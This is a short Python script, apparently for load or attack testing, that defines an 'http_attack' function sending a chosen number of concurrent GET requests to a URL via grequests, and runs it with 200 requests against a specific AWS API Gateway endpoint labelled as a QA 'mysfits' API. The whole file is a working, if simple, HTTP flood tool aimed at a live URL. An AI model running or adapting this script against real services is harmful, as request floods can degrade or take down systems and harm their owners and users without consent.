import grequests


# URL: target url of the attack
# PPS: number of request for that second
def http_attack(url, pps=None):
    if isinstance(pps, int) and pps > 0:
        payload = [url for i in range(pps)]
        rs = (grequests.get(u) for u in payload)
        res = grequests.map(rs)

        print(res)
    else:
        print(f"http attack function got a invalid number: {pps}")


if __name__ == "__main__":
    # sample test on qa mysfits api
    http_attack('https://6jztqidvd6.execute-api.us-east-1.amazonaws.com/qa/mysfits/b6d16e02-6aeb-413c-b457-321151bb403d', 200)